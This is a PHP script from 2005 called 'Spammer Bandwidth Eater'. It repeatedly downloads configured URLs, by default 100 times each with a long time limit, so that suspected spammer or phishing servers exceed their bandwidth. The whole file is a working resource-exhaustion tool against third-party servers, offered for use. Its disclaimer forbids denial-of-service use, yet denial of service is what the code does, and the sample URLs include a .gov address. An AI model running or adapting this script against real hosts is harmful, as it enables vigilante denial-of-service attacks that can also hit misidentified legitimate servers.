<?php
//
// Spammer Bandwidth Eater version 1.0
// copyright 2005 by Mike Robinson
// 

///////////////////////
///// Information /////
///////////////////////
/*
This script was developed using the ideas of http://www.aa419.org for
people that extra bandwidth on their server. This script can be run to
download anywhere from a few kilobytes to gigabytes from companies that
advertise by using spam or individuals that try to steal your information
by creating fake websites to look like legitimate ones, such as PayPal, 
eBay or various bank accounts.

What this script does:
----------------------
This script will loop through the $url array and download all of the URLs
that you specify the number of times you tell it to. For the largest effect,
I recommend going to the website and finding the largest images to use them.
Hopefully, the spammer will go over their monthly bandwidth and their account
will be cancelled.

Where to find the images to put into the URL array:
---------------------------------------------------
If you don't receive any spam e-mails to your inbox, try visiting 
http://www.aa419.org and use any of the small images they have on the right
hand side of the page. You can also view their fake bank list at:
http://www.aa419.org/fake-banks/fakebankslist.php

Important information:
----------------------
By using this script you agree that you understand fully the capabilities and
consequences of this script. You also agree that you will fully investigate 
any and all URLs that you download from and make sure that they are coming from
the server that someone linked to in a spam e-mail, you must be certain that you
did not sign up for the e-mails you are receiving and you must be certain that
it is not linking to an image found on a legitimate server. This script may not 
be used for Denial of Service attacks. Failing to comply to these terms may 
result in complaints being filed towards your server for malicious practices. 
The author of this script accepts no responsibility for any damage that you cause
by using it.

Do not access this script more than once at any given time per server as it may
cause your server to lag severely if too many instances are running.

*/
///////////////////////
//// Configuration ////
///////////////////////

// Maximum amount of time you want the script to execute for (in seconds)
set_time_limit(100000); 

// Number of times to download EACH URL
$max = 100; 

// Enter all of the URLs below. You can add more if you wish:
$urls[] = 'http://someurl.com/somephoto.jpg';
$urls[] = 'http://anotherurl.com/img/ilikespam.jpg'; 
$urls[] = 'http://ww2.helloworld.gov/largeimage.png'; 


// Number of downloads before the display at the bottom is updated
$update = 10;

///////////////////////
///// End Config //////
///////////////////////


// !!! Do not edit below this line unless you know what you are doing !!! //
// -----------------------------------------------------------------------//

$time_start = time();
$url_array_size = count($urls);

?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" 
   "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Spammer Bandwidth Eater</title>
<style type="text/css">
	<!--
	#current {position:absolute; bottom:25px; font-size:70%; border-top: 1px dotted red; width:80%;}
	#totals {position:absolute; bottom:25px; left:40%; font-size:70%; width:40%;}
	#results {position:absolute; top:0px; left:0; width:80%; height:70%; border: 1px dotted red; overflow:auto;}
	#copy {font-size:70%; text-align:center;}
	-->
</style>
</head>
<body>

<div id="current">
	<b>Current</b>: <span id="url"></span><br />
	Filesize: <span id="filesize"></span> bytes<br />
	Number downloaded: <span id="success">0</span><br />
	Number failed: <span id="errors">0</span><br />
	Bandwidth stolen: <span id="bandwidth"></span> MB<br />
	Percent complete: <span id="percent">0.00</span>%<br />	
</div>
<div id="totals">
	<b>Totals:</b><br />
	URLs Complete: <span id="total_urls">0</span> of <?=$url_array_size;?><br />
	Total Downloads: <span id="total_dls">0</span><br />
	Total Fails: <span id="total_fails">0</span><br />
	Total bandwidth stolen: <span id="total_bandwidth">0</span> MB<br />
	Time elapsed: <span id="time">0</span> sec
</div>
<div id="results">
	<div id="copy">Spammer Bandwidth Eater v.1.0<br />
	Created by Mike Robinson &copy; 2005
	</div>

<?php
flush();
$total_urls = 0;
$total_dls = 0;
$total_fails = 0;
$total_bandwidth = 0;
$base_bandwidth = 0;
foreach ($urls as $filename) {
	$n = 0;
	$errors = 0;
	$filesize= get_filesize($filename);
	if ($filesize > 0) {
		echo "<p>Downloading $filename ($filesize bytes)<br />
			<script type=\"text/javascript\">
			<!--
			document.getElementById(\"url\").innerHTML=\"$filename\";
			document.getElementById(\"filesize\").innerHTML=\"$filesize\";
			document.getElementById(\"total_urls\").innerHTML=\"$total_urls\";
			-->
			</script>";
		flush();
		while ($n < $max) {
			if (($handle = @fopen($filename, 'rb')) === FALSE) {
				$errors++;
				$total_fails++;
			}
			else {
				while (!feof($handle)) {
					$contents = fread($handle, 8192);
				}
				fclose($handle);
				$total_dls++;
			}
			$n++;
			if ($n % $update == 0) {
				$success = $n - $errors;
				$bandwidth = round($success * $filesize / (1024*1024), 4);
				$total_bandwidth = round($base_bandwidth / (1024*1024) + $bandwidth, 4);
				$percent = round($n / $max * 100, 4);
				$time = time() - $time_start;
				if ($time > 59) {
					$time_display = floor($time/60).' min '.$time%60;
				}
				else $time_display = $time;
				echo "<script type=\"text/javascript\">
					<!--
					document.getElementById(\"success\").innerHTML=\"$success\";
					document.getElementById(\"errors\").innerHTML=\"$errors\";
					document.getElementById(\"bandwidth\").innerHTML=\"$bandwidth\";
					document.getElementById(\"percent\").innerHTML=\"$percent\";
					document.getElementById(\"time\").innerHTML=\"$time_display\";
					document.getElementById(\"total_dls\").innerHTML=\"$total_dls\";
					document.getElementById(\"total_fails\").innerHTML=\"$total_fails\";
					document.getElementById(\"total_bandwidth\").innerHTML=\"$total_bandwidth\";
					-->
					</script>";
				flush();
			}
		}
		echo "Total failed: $errors<br />";
		echo "Total bandwidth stolen:<br />";
		$bandwidth = ($max - $errors) * $filesize;
		$base_bandwidth += $bandwidth;
		echo '--- '.$bandwidth .' bytes<br />'.
			'--- '.round($bandwidth / 1024, 2) .' KB<br />'.
			'--- '.round($bandwidth / (1024*1024), 3) .' MB<br />'.
			'--- '.round($bandwidth / (1024*1024*1024), 5) .' GB</p>';
	}
	else echo "<p>Error: Could not get filesize of $filename</p>";
	$total_urls++;
}
echo "<script type=\"text/javascript\">
	<!--
	document.getElementById(\"current\").innerHTML=\"\";
	document.getElementById(\"total_urls\").innerHTML=\"$total_urls\";
	document.getElementById(\"time\").innerHTML=\"$time_display\";
	document.getElementById(\"total_dls\").innerHTML=\"$total_dls\";
	document.getElementById(\"total_fails\").innerHTML=\"$total_fails\";
	document.getElementById(\"total_bandwidth\").innerHTML=\"$total_bandwidth\";
	-->
</script>";


function get_filesize ($url) {
	ereg("http://([^/]*)/(.*)$", $url, $regs);     
	$host = $regs[1]; 
	$path = "/" . $regs[2]; 
	    
	$fp = fsockopen($host, 80, &$errno, &$errstr, 10);  
	    
	if (!$fp) {  
		return -1;
	}
	
	else {  
		fputs($fp,"HEAD $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n\r\n");  
		while(!feof($fp)) {  
			$response .= fgets($fp,128);  
		}  
		fclose($fp);  
	}  

	$SizeOfFile = ereg_replace("(.*)(Content-Length: )([0-9]*)(.*)","\\3",$response); 
	if (empty($SizeOfFile)) return 0;

	else return $SizeOfFile;
}?>
</div>
</body>
</html>